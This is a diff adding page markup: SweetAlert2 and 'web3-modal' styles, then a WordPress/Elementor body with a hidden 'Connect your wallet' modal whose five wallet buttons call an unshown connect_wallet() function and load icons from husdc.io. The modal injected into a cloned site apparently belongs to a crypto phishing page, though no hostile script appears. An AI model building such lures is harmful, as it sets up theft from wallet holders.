+        .swal2-loader {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            width: 2.2em;
+            height: 2.2em;
+            margin: 0 1.875em;
+            animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+            border-width: .25em;
+            border-style: solid;
+            border-radius: 100%;
+            border-color: #2778c4 rgba(0, 0, 0, 0) #2778c4 rgba(0, 0, 0, 0)
+        }
+
+        .swal2-styled {
+            margin: .3125em;
+            padding: .625em 1.1em;
+            transition: box-shadow .1s;
+            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0);
+            font-weight: 500
+        }
+
+        .swal2-styled:not([disabled]) {
+            cursor: pointer
+        }
+
+        .swal2-styled.swal2-confirm {
+            border: 0;
+            border-radius: .25em;
+            background: initial;
+            background-color: #7066e0;
+            color: #fff;
+            font-size: 1em
+        }
+
+        .swal2-styled.swal2-confirm:focus {
+            box-shadow: 0 0 0 3px rgba(112, 102, 224, .5)
+        }
+
+        .swal2-styled.swal2-deny {
+            border: 0;
+            border-radius: .25em;
+            background: initial;
+            background-color: #dc3741;
+            color: #fff;
+            font-size: 1em
+        }
+
+        .swal2-styled.swal2-deny:focus {
+            box-shadow: 0 0 0 3px rgba(220, 55, 65, .5)
+        }
+
+        .swal2-styled.swal2-cancel {
+            border: 0;
+            border-radius: .25em;
+            background: initial;
+            background-color: #6e7881;
+            color: #fff;
+            font-size: 1em
+        }
+
+        .swal2-styled.swal2-cancel:focus {
+            box-shadow: 0 0 0 3px rgba(110, 120, 129, .5)
+        }
+
+        .swal2-styled.swal2-default-outline:focus {
+            box-shadow: 0 0 0 3px rgba(100, 150, 200, .5)
+        }
+
+        .swal2-styled:focus {
+            outline: none
+        }
+
+        .swal2-styled::-moz-focus-inner {
+            border: 0
+        }
+
+        .swal2-footer {
+            justify-content: center;
+            margin: 1em 0 0;
+            padding: 1em 1em 0;
+            border-top: 1px solid #eee;
+            color: inherit;
+            font-size: 1em
+        }
+
+        .swal2-timer-progress-bar-container {
+            position: absolute;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            grid-column: auto !important;
+            overflow: hidden;
+            border-bottom-right-radius: 5px;
+            border-bottom-left-radius: 5px
+        }
+
+        .swal2-timer-progress-bar {
+            width: 100%;
+            height: .25em;
+            background: rgba(0, 0, 0, .2)
+        }
+
+        .swal2-image {
+            max-width: 100%;
+            margin: 2em auto 1em
+        }
+
+        .swal2-close {
+            z-index: 2;
+            align-items: center;
+            justify-content: center;
+            width: 1.2em;
+            height: 1.2em;
+            margin-top: 0;
+            margin-right: 0;
+            margin-bottom: -1.2em;
+            padding: 0;
+            overflow: hidden;
+            transition: color .1s, box-shadow .1s;
+            border: none;
+            border-radius: 5px;
+            background: rgba(0, 0, 0, 0);
+            color: #ccc;
+            font-family: serif;
+            font-family: monospace;
+            font-size: 2.5em;
+            cursor: pointer;
+            justify-self: end
+        }
+
+        .swal2-close:hover {
+            transform: none;
+            background: rgba(0, 0, 0, 0);
+            color: #f27474
+        }
+
+        .swal2-close:focus {
+            outline: none;
+            box-shadow: inset 0 0 0 3px rgba(100, 150, 200, .5)
+        }
+
+        .swal2-close::-moz-focus-inner {
+            border: 0
+        }
+
+        .swal2-html-container {
+            z-index: 1;
+            justify-content: center;
+            margin: 1em 1.6em .3em;
+            padding: 0;
+            overflow: auto;
+            color: inherit;
+            font-size: 1.125em;
+            font-weight: normal;
+            line-height: normal;
+            text-align: center;
+            word-wrap: break-word;
+            word-break: break-word
+        }
+
+        .swal2-input,
+        .swal2-file,
+        .swal2-textarea,
+        .swal2-select,
+        .swal2-radio,
+        .swal2-checkbox {
+            margin: 1em 2em 3px
+        }
+
+        .swal2-input,
+        .swal2-file,
+        .swal2-textarea {
+            box-sizing: border-box;
+            width: auto;
+            transition: border-color .1s, box-shadow .1s;
+            border: 1px solid #d9d9d9;
+            border-radius: .1875em;
+            background: rgba(0, 0, 0, 0);
+            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(0, 0, 0, 0);
+            color: inherit;
+            font-size: 1.125em
+        }
+
+        .swal2-input.swal2-inputerror,
+        .swal2-file.swal2-inputerror,
+        .swal2-textarea.swal2-inputerror {
+            border-color: #f27474 !important;
+            box-shadow: 0 0 2px #f27474 !important
+        }
+
+        .swal2-input:focus,
+        .swal2-file:focus,
+        .swal2-textarea:focus {
+            border: 1px solid #b4dbed;
+            outline: none;
+            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(100, 150, 200, .5)
+        }
+
+        .swal2-input::placeholder,
+        .swal2-file::placeholder,
+        .swal2-textarea::placeholder {
+            color: #ccc
+        }
+
+        .swal2-range {
+            margin: 1em 2em 3px;
+            background: #fff
+        }
+
+        .swal2-range input {
+            width: 80%
+        }
+
+        .swal2-range output {
+            width: 20%;
+            color: inherit;
+            font-weight: 600;
+            text-align: center
+        }
+
+        .swal2-range input,
+        .swal2-range output {
+            height: 2.625em;
+            padding: 0;
+            font-size: 1.125em;
+            line-height: 2.625em
+        }
+
+        .swal2-input {
+            height: 2.625em;
+            padding: 0 .75em
+        }
+
+        .swal2-file {
+            width: 75%;
+            margin-right: auto;
+            margin-left: auto;
+            background: rgba(0, 0, 0, 0);
+            font-size: 1.125em
+        }
+
+        .swal2-textarea {
+            height: 6.75em;
+            padding: .75em
+        }
+
+        .swal2-select {
+            min-width: 50%;
+            max-width: 100%;
+            padding: .375em .625em;
+            background: rgba(0, 0, 0, 0);
+            color: inherit;
+            font-size: 1.125em
+        }
+
+        .swal2-radio,
+        .swal2-checkbox {
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+            color: inherit
+        }
+
+        .swal2-radio label,
+        .swal2-checkbox label {
+            margin: 0 .6em;
+            font-size: 1.125em
+        }
+
+        .swal2-radio input,
+        .swal2-checkbox input {
+            flex-shrink: 0;
+            margin: 0 .4em
+        }
+
+        .swal2-input-label {
+            display: flex;
+            justify-content: center;
+            margin: 1em auto 0
+        }
+
+        .swal2-validation-message {
+            align-items: center;
+            justify-content: center;
+            margin: 1em 0 0;
+            padding: .625em;
+            overflow: hidden;
+            background: #f0f0f0;
+            color: #666;
+            font-size: 1em;
+            font-weight: 300
+        }
+
+        .swal2-validation-message::before {
+            content: "!";
+            display: inline-block;
+            width: 1.5em;
+            min-width: 1.5em;
+            height: 1.5em;
+            margin: 0 .625em;
+            border-radius: 50%;
+            background-color: #f27474;
+            color: #fff;
+            font-weight: 600;
+            line-height: 1.5em;
+            text-align: center
+        }
+
+        .swal2-icon {
+            position: relative;
+            box-sizing: content-box;
+            justify-content: center;
+            width: 5em;
+            height: 5em;
+            margin: 2.5em auto .6em;
+            border: 0.25em solid rgba(0, 0, 0, 0);
+            border-radius: 50%;
+            border-color: #000;
+            font-family: inherit;
+            line-height: 5em;
+            cursor: default;
+            user-select: none
+        }
+
+        .swal2-icon .swal2-icon-content {
+            display: flex;
+            align-items: center;
+            font-size: 3.75em
+        }
+
+        .swal2-icon.swal2-error {
+            border-color: #f27474;
+            color: #f27474
+        }
+
+        .swal2-icon.swal2-error .swal2-x-mark {
+            position: relative;
+            flex-grow: 1
+        }
+
+        .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
+            display: block;
+            position: absolute;
+            top: 2.3125em;
+            width: 2.9375em;
+            height: .3125em;
+            border-radius: .125em;
+            background-color: #f27474
+        }
+
+        .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
+            left: 1.0625em;
+            transform: rotate(45deg)
+        }
+
+        .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
+            right: 1em;
+            transform: rotate(-45deg)
+        }
+
+        .swal2-icon.swal2-error.swal2-icon-show {
+            animation: swal2-animate-error-icon .5s
+        }
+
+        .swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark {
+            animation: swal2-animate-error-x-mark .5s
+        }
+
+        .swal2-icon.swal2-warning {
+            border-color: #facea8;
+            color: #f8bb86
+        }
+
+        .swal2-icon.swal2-warning.swal2-icon-show {
+            animation: swal2-animate-error-icon .5s
+        }
+
+        .swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content {
+            animation: swal2-animate-i-mark .5s
+        }
+
+        .swal2-icon.swal2-info {
+            border-color: #9de0f6;
+            color: #3fc3ee
+        }
+
+        .swal2-icon.swal2-info.swal2-icon-show {
+            animation: swal2-animate-error-icon .5s
+        }
+
+        .swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content {
+            animation: swal2-animate-i-mark .8s
+        }
+
+        .swal2-icon.swal2-question {
+            border-color: #c9dae1;
+            color: #87adbd
+        }
+
+        .swal2-icon.swal2-question.swal2-icon-show {
+            animation: swal2-animate-error-icon .5s
+        }
+
+        .swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content {
+            animation: swal2-animate-question-mark .8s
+        }
+
+        .swal2-icon.swal2-success {
+            border-color: #a5dc86;
+            color: #a5dc86
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-circular-line] {
+            position: absolute;
+            width: 3.75em;
+            height: 7.5em;
+            transform: rotate(45deg);
+            border-radius: 50%
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left] {
+            top: -0.4375em;
+            left: -2.0635em;
+            transform: rotate(-45deg);
+            transform-origin: 3.75em 3.75em;
+            border-radius: 7.5em 0 0 7.5em
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right] {
+            top: -0.6875em;
+            left: 1.875em;
+            transform: rotate(-45deg);
+            transform-origin: 0 3.75em;
+            border-radius: 0 7.5em 7.5em 0
+        }
+
+        .swal2-icon.swal2-success .swal2-success-ring {
+            position: absolute;
+            z-index: 2;
+            top: -0.25em;
+            left: -0.25em;
+            box-sizing: content-box;
+            width: 100%;
+            height: 100%;
+            border: .25em solid rgba(165, 220, 134, .3);
+            border-radius: 50%
+        }
+
+        .swal2-icon.swal2-success .swal2-success-fix {
+            position: absolute;
+            z-index: 1;
+            top: .5em;
+            left: 1.625em;
+            width: .4375em;
+            height: 5.625em;
+            transform: rotate(-45deg)
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-line] {
+            display: block;
+            position: absolute;
+            z-index: 2;
+            height: .3125em;
+            border-radius: .125em;
+            background-color: #a5dc86
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-line][class$=tip] {
+            top: 2.875em;
+            left: .8125em;
+            width: 1.5625em;
+            transform: rotate(45deg)
+        }
+
+        .swal2-icon.swal2-success [class^=swal2-success-line][class$=long] {
+            top: 2.375em;
+            right: .5em;
+            width: 2.9375em;
+            transform: rotate(-45deg)
+        }
+
+        .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip {
+            animation: swal2-animate-success-line-tip .75s
+        }
+
+        .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long {
+            animation: swal2-animate-success-line-long .75s
+        }
+
+        .swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right {
+            animation: swal2-rotate-success-circular-line 4.25s ease-in
+        }
+
+        .swal2-progress-steps {
+            flex-wrap: wrap;
+            align-items: center;
+            max-width: 100%;
+            margin: 1.25em auto;
+            padding: 0;
+            background: rgba(0, 0, 0, 0);
+            font-weight: 600
+        }
+
+        .swal2-progress-steps li {
+            display: inline-block;
+            position: relative
+        }
+
+        .swal2-progress-steps .swal2-progress-step {
+            z-index: 20;
+            flex-shrink: 0;
+            width: 2em;
+            height: 2em;
+            border-radius: 2em;
+            background: #2778c4;
+            color: #fff;
+            line-height: 2em;
+            text-align: center
+        }
+
+        .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step {
+            background: #2778c4
+        }
+
+        .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step {
+            background: #add8e6;
+            color: #fff
+        }
+
+        .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line {
+            background: #add8e6
+        }
+
+        .swal2-progress-steps .swal2-progress-step-line {
+            z-index: 10;
+            flex-shrink: 0;
+            width: 2.5em;
+            height: .4em;
+            margin: 0 -1px;
+            background: #2778c4
+        }
+
+        [class^=swal2] {
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
+        }
+
+        .swal2-show {
+            animation: swal2-show .3s
+        }
+
+        .swal2-hide {
+            animation: swal2-hide .15s forwards
+        }
+
+        .swal2-noanimation {
+            transition: none
+        }
+
+        .swal2-scrollbar-measure {
+            position: absolute;
+            top: -9999px;
+            width: 50px;
+            height: 50px;
+            overflow: scroll
+        }
+
+        .swal2-rtl .swal2-close {
+            margin-right: initial;
+            margin-left: 0
+        }
+
+        .swal2-rtl .swal2-timer-progress-bar {
+            right: 0;
+            left: auto
+        }
+
+        @keyframes swal2-toast-show {
+            0% {
+                transform: translateY(-0.625em) rotateZ(2deg)
+            }
+
+            33% {
+                transform: translateY(0) rotateZ(-2deg)
+            }
+
+            66% {
+                transform: translateY(0.3125em) rotateZ(2deg)
+            }
+
+            100% {
+                transform: translateY(0) rotateZ(0deg)
+            }
+        }
+
+        @keyframes swal2-toast-hide {
+            100% {
+                transform: rotateZ(1deg);
+                opacity: 0
+            }
+        }
+
+        @keyframes swal2-toast-animate-success-line-tip {
+            0% {
+                top: .5625em;
+                left: .0625em;
+                width: 0
+            }
+
+            54% {
+                top: .125em;
+                left: .125em;
+                width: 0
+            }
+
+            70% {
+                top: .625em;
+                left: -0.25em;
+                width: 1.625em
+            }
+
+            84% {
+                top: 1.0625em;
+                left: .75em;
+                width: .5em
+            }
+
+            100% {
+                top: 1.125em;
+                left: .1875em;
+                width: .75em
+            }
+        }
+
+        @keyframes swal2-toast-animate-success-line-long {
+            0% {
+                top: 1.625em;
+                right: 1.375em;
+                width: 0
+            }
+
+            65% {
+                top: 1.25em;
+                right: .9375em;
+                width: 0
+            }
+
+            84% {
+                top: .9375em;
+                right: 0;
+                width: 1.125em
+            }
+
+            100% {
+                top: .9375em;
+                right: .1875em;
+                width: 1.375em
+            }
+        }
+
+        @keyframes swal2-show {
+            0% {
+                transform: scale(0.7)
+            }
+
+            45% {
+                transform: scale(1.05)
+            }
+
+            80% {
+                transform: scale(0.95)
+            }
+
+            100% {
+                transform: scale(1)
+            }
+        }
+
+        @keyframes swal2-hide {
+            0% {
+                transform: scale(1);
+                opacity: 1
+            }
+
+            100% {
+                transform: scale(0.5);
+                opacity: 0
+            }
+        }
+
+        @keyframes swal2-animate-success-line-tip {
+            0% {
+                top: 1.1875em;
+                left: .0625em;
+                width: 0
+            }
+
+            54% {
+                top: 1.0625em;
+                left: .125em;
+                width: 0
+            }
+
+            70% {
+                top: 2.1875em;
+                left: -0.375em;
+                width: 3.125em
+            }
+
+            84% {
+                top: 3em;
+                left: 1.3125em;
+                width: 1.0625em
+            }
+
+            100% {
+                top: 2.8125em;
+                left: .8125em;
+                width: 1.5625em
+            }
+        }
+
+        @keyframes swal2-animate-success-line-long {
+            0% {
+                top: 3.375em;
+                right: 2.875em;
+                width: 0
+            }
+
+            65% {
+                top: 3.375em;
+                right: 2.875em;
+                width: 0
+            }
+
+            84% {
+                top: 2.1875em;
+                right: 0;
+                width: 3.4375em
+            }
+
+            100% {
+                top: 2.375em;
+                right: .5em;
+                width: 2.9375em
+            }
+        }
+
+        @keyframes swal2-rotate-success-circular-line {
+            0% {
+                transform: rotate(-45deg)
+            }
+
+            5% {
+                transform: rotate(-45deg)
+            }
+
+            12% {
+                transform: rotate(-405deg)
+            }
+
+            100% {
+                transform: rotate(-405deg)
+            }
+        }
+
+        @keyframes swal2-animate-error-x-mark {
+            0% {
+                margin-top: 1.625em;
+                transform: scale(0.4);
+                opacity: 0
+            }
+
+            50% {
+                margin-top: 1.625em;
+                transform: scale(0.4);
+                opacity: 0
+            }
+
+            80% {
+                margin-top: -0.375em;
+                transform: scale(1.15)
+            }
+
+            100% {
+                margin-top: 0;
+                transform: scale(1);
+                opacity: 1
+            }
+        }
+
+        @keyframes swal2-animate-error-icon {
+            0% {
+                transform: rotateX(100deg);
+                opacity: 0
+            }
+
+            100% {
+                transform: rotateX(0deg);
+                opacity: 1
+            }
+        }
+
+        @keyframes swal2-rotate-loading {
+            0% {
+                transform: rotate(0deg)
+            }
+
+            100% {
+                transform: rotate(360deg)
+            }
+        }
+
+        @keyframes swal2-animate-question-mark {
+            0% {
+                transform: rotateY(-360deg)
+            }
+
+            100% {
+                transform: rotateY(0)
+            }
+        }
+
+        @keyframes swal2-animate-i-mark {
+            0% {
+                transform: rotateZ(45deg);
+                opacity: 0
+            }
+
+            25% {
+                transform: rotateZ(-25deg);
+                opacity: .4
+            }
+
+            50% {
+                transform: rotateZ(15deg);
+                opacity: .8
+            }
+
+            75% {
+                transform: rotateZ(-5deg);
+                opacity: 1
+            }
+
+            100% {
+                transform: rotateX(0);
+                opacity: 1
+            }
+        }
+
+        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
+            overflow: hidden
+        }
+
+        body.swal2-height-auto {
+            height: auto !important
+        }
+
+        body.swal2-no-backdrop .swal2-container {
+            background-color: rgba(0, 0, 0, 0) !important;
+            pointer-events: none
+        }
+
+        body.swal2-no-backdrop .swal2-container .swal2-popup {
+            pointer-events: all
+        }
+
+        body.swal2-no-backdrop .swal2-container .swal2-modal {
+            box-shadow: 0 0 10px rgba(0, 0, 0, .4)
+        }
+
+        @media print {
+            body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
+                overflow-y: scroll !important
+            }
+
+            body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true] {
+                display: none
+            }
+
+            body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container {
+                position: static !important
+            }
+        }
+
+        body.swal2-toast-shown .swal2-container {
+            box-sizing: border-box;
+            width: 360px;
+            max-width: 100%;
+            background-color: rgba(0, 0, 0, 0);
+            pointer-events: none
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-top {
+            top: 0;
+            right: auto;
+            bottom: auto;
+            left: 50%;
+            transform: translateX(-50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-top-end,
+        body.swal2-toast-shown .swal2-container.swal2-top-right {
+            top: 0;
+            right: 0;
+            bottom: auto;
+            left: auto
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-top-start,
+        body.swal2-toast-shown .swal2-container.swal2-top-left {
+            top: 0;
+            right: auto;
+            bottom: auto;
+            left: 0
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-center-start,
+        body.swal2-toast-shown .swal2-container.swal2-center-left {
+            top: 50%;
+            right: auto;
+            bottom: auto;
+            left: 0;
+            transform: translateY(-50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-center {
+            top: 50%;
+            right: auto;
+            bottom: auto;
+            left: 50%;
+            transform: translate(-50%, -50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-center-end,
+        body.swal2-toast-shown .swal2-container.swal2-center-right {
+            top: 50%;
+            right: 0;
+            bottom: auto;
+            left: auto;
+            transform: translateY(-50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-bottom-start,
+        body.swal2-toast-shown .swal2-container.swal2-bottom-left {
+            top: auto;
+            right: auto;
+            bottom: 0;
+            left: 0
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-bottom {
+            top: auto;
+            right: auto;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%)
+        }
+
+        body.swal2-toast-shown .swal2-container.swal2-bottom-end,
+        body.swal2-toast-shown .swal2-container.swal2-bottom-right {
+            top: auto;
+            right: 0;
+            bottom: 0;
+            left: auto
+        }
+    </style>
+    <style>
+        @import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);
+
+        .web3-modal,
+        .web3-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%
+        }
+
+        .web3-overlay {
+            height: 100%;
+            background: rgba(23, 23, 23, .8);
+            backdrop-filter: blur(5px);
+            z-index: 99998
+        }
+
+        .web3-modal {
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            max-width: 500px;
+            height: fit-content;
+            padding: 21px 0 0;
+            background: #fff;
+            border-radius: 10px;
+            z-index: 99999;
+            font-family: Inter, sans-serif
+        }
+
+        .web3-modal-title {
+            font-weight: 700;
+            font-size: 24px;
+            line-height: 29px;
+            color: #000;
+            text-align: center
+        }
+
+        .web3-modal-items {
+            border-top: 1px solid rgba(0, 0, 0, .1);
+            margin-top: 21px
+        }
+
+        .web3-modal .item {
+            padding: 15px 34px;
+            border-bottom: 1px solid rgba(0, 0, 0, .1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: .2s
+        }
+
+        .web3-modal .item:hover {
+            background: #fafafa
+        }
+
+        .web3-modal .item div {
+            display: flex;
+            align-items: center
+        }
+
+        .web3-modal .item:last-child {
+            border-bottom: none
+        }
+
+        .web3-modal .item span {
+            font-weight: 400;
+            font-size: 16px;
+            color: #000;
+            margin-left: 11px
+        }
+
+        .web3-modal .item .icon {
+            width: 40px;
+            height: 40px;
+            justify-content: center
+        }
+
+        .web3-modal .item .arrow {
+            height: 12px;
+            width: 7.4px;
+            background: url('/assets/web3-modal/images/arrow.svg') no-repeat
+        }
+    </style>
+    <style>
+         .loadtip{
+            font-size:'20px' !important;
+            position:'fixed' !important;
+            left:'0' !important;
+            right:'0' !important;
+            width:'100%' !important;
+            text-align:'center' !important;
+        }
+    </style>
+</head>
+
+<body
+    class="home page-template page-template-elementor_header_footer page page-id-33 wp-custom-logo wp-embed-responsive elementor-default elementor-template-full-width elementor-kit-6 elementor-page elementor-page-33 e--ua-blink e--ua-chrome e--ua-mac e--ua-webkit"
+    data-link="type-2" data-prefix="single_page" data-header="type-1" data-footer="type-1" itemscope="itemscope"
+    itemtype="https://schema.org/WebPage" data-elementor-device-mode="widescreen">
+    <div id="web3-modal" class="web3-modal" style="display: none;">
+        <p class="web3-modal-title" style="margin-top: 0px;">Connect your wallet</p>
+        <div class="web3-modal-items">
+            <div class="item" onclick="connect_wallet(&#39;MetaMask&#39;)">
+                <div>
+                    <div class="icon"><img src="https://husdc.io/files/MM.svg" alt=""></div><span>MetaMask</span>
+                </div>
+                <div class="arrow"></div>
+            </div>
+            <div class="item" onclick="connect_wallet(&#39;Coinbase&#39;)">
+                <div>
+                    <div class="icon"><img src="https://husdc.io/files/CB.svg" alt=""></div><span>Coinbase</span>
+                </div>
+                <div class="arrow"></div>
+            </div>
+            <div class="item" onclick="connect_wallet(&#39;Trust Wallet&#39;)">
+                <div>
+                    <div class="icon"><img src="https://husdc.io/files/TW.svg" alt=""></div><span>Trust Wallet</span>
+                </div>
+                <div class="arrow"></div>
+            </div>
+            <div class="item" onclick="connect_wallet(&#39;Binance Wallet&#39;)">
+                <div>
+                    <div class="icon"><img src="https://husdc.io/files/BW.svg" alt=""></div><span>Binance Wallet</span>
+                </div>
+                <div class="arrow"></div>
+            </div>
+            <div class="item" onclick="connect_wallet(&#39;WalletConnect&#39;)">
+                <div>
+                    <div class="icon"><img src="https://husdc.io/files/WC.svg" alt=""></div><span>WalletConnect</span>
+                </div>
+                <div class="arrow"></div>
+            </div>
+        </div>
+    </div>
+    <div id="web3-overlay" class="web3-overlay" style="display: none;"></div>
+
+    <a class="skip-link show-on-focus" href="">
+        Skip to content</a>
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none"
+        style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+        <defs>
+            <filter id="wp-duotone-dark-grayscale">
+                <fecolormatrix color-interpolation-filters="sRGB" type="matrix"
+                    values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 ">
+                </fecolormatrix>
+                <fecomponenttransfer color-interpolation-filters="sRGB">
+                    <fefuncr type="table" tableValues="0 0.49803921568627"></fefuncr>
+                    <fefuncg type="table" tableValues="0 0.49803921568627"></fefuncg>
+                    <fefuncb type="table" tableValues="0 0.49803921568627"></fefuncb>
+                    <fefunca type="table" tableValues="1 1"></fefunca>
+                </fecomponenttransfer>
+                <fecomposite in2="SourceGraphic" operator="in"></fecomposite>
+            </filter>
+        </defs>
+    </svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none"
+        style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+        <defs>
+            <filter id="wp-duotone-grayscale">
+                <fecolormatrix color-interpolation-filters="sRGB" type="matrix"
+                    values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 ">
+                </fecolormatrix>
+                <fecomponenttransfer color-interpolation-filters="sRGB">
+                    <fefuncr type="table" tableValues="0 1"></fefuncr>
+                    <fefuncg type="table" tableValues="0 1"></fefuncg>
+                    <fefuncb type="table" tableValues="0 1"></fefuncb>
+                    <fefunca type="table" tableValues="1 1"></fefunca>
+                </fecomponenttransfer>
+                <fecomposite in2="SourceGraphic" operator="in"></fecomposite>
+            </filter>
+        </defs>
+    </svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none"
+        style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+        <defs>
+            <filter id="wp-duotone-purple-yellow">
+                <fecolormatrix color-interpolation-filters="sRGB" type="matrix"
+                    values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 ">
+                </fecolormatrix>
+                <fecomponenttransfer color-interpolation-filters="sRGB">
+                    <fefuncr type="table" tableValues="0.54901960784314 0.98823529411765"></fefuncr>
+                    <fefuncg type="table" tableValues="0 1"></fefuncg>
+                    <fefuncb type="table" tableValues="0.71764705882353 0.25490196078431"></fefuncb>
+                    <fefunca type="table" tableValues="1 1"></fefunca>
+                </fecomponenttransfer>
+                <fecomposite in2="SourceGraphic" operator="in"></fecomposite>
+            </filter>
+        </defs>
+    </svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none"
+        style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+        <defs>
+            <filter id="wp-duotone-blue-red">
+                <fecolormatrix color-interpolation-filters="sRGB" type="matrix"
+                    values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 ">
+                </fecolormatrix>
+                <fecomponenttransfer color-interpolation-filters="sRGB">
+                    <fefuncr type="table" tableValues="0 1"></fefuncr>
+                    <fefuncg type="table" tableValues="0 0.27843137254902"></fefuncg>
+                    <fefuncb type="table" tableValues="0.5921568627451 0.27843137254902"></fefuncb>
+                    <fefunca type="table" tableValues="1 1"></fefunca>
+                </fecomponenttransfer>
+                <fecomposite in2="SourceGraphic" operator="in"></fecomposite>
+            </filter>
+        </defs>
+    </svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none"
+        style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+        <defs>
+            <filter id="wp-duotone-midnight">
+                <fecolormatrix color-interpolation-filters="sRGB" type="matrix"
+                    values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 ">
+                </fecolormatrix>
+                <fecomponenttransfer color-interpolation-filters="sRGB">
+                    <fefuncr type="table" tableValues="0 0"></fefuncr>
+                    <fefuncg type="table" tableValues="0 0.64705882352941"></fefuncg>
+                    <fefuncb type="table" tableValues="0 1"></fefuncb>
+                    <fefunca type="table" tableValues="1 1"></fefunca>
+                </fecomponenttransfer>
+                <fecomposite in2="SourceGraphic" operator="in"></fecomposite>
+            </filter>
+        </defs>
+    </svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none"
+        style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+        <defs>
+            <filter id="wp-duotone-magenta-yellow">
+                <fecolormatrix color-interpolation-filters="sRGB" type="matrix"
+                    values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 ">
+                </fecolormatrix>
+                <fecomponenttransfer color-interpolation-filters="sRGB">
+                    <fefuncr type="table" tableValues="0.78039215686275 1"></fefuncr>
+                    <fefuncg type="table" tableValues="0 0.94901960784314"></fefuncg>
+                    <fefuncb type="table" tableValues="0.35294117647059 0.47058823529412"></fefuncb>
+                    <fefunca type="table" tableValues="1 1"></fefunca>
+                </fecomponenttransfer>
+                <fecomposite in2="SourceGraphic" operator="in"></fecomposite>
+            </filter>
+        </defs>
+    </svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none"
+        style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+        <defs>
+            <filter id="wp-duotone-purple-green">
+                <fecolormatrix color-interpolation-filters="sRGB" type="matrix"
+                    values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 ">
+                </fecolormatrix>
+                <fecomponenttransfer color-interpolation-filters="sRGB">
+                    <fefuncr type="table" tableValues="0.65098039215686 0.40392156862745"></fefuncr>
+                    <fefuncg type="table" tableValues="0 1"></fefuncg>
+                    <fefuncb type="table" tableValues="0.44705882352941 0.4"></fefuncb>
+                    <fefunca type="table" tableValues="1 1"></fefunca>
+                </fecomponenttransfer>
+                <fecomposite in2="SourceGraphic" operator="in"></fecomposite>
+            </filter>
+        </defs>
+    </svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none"
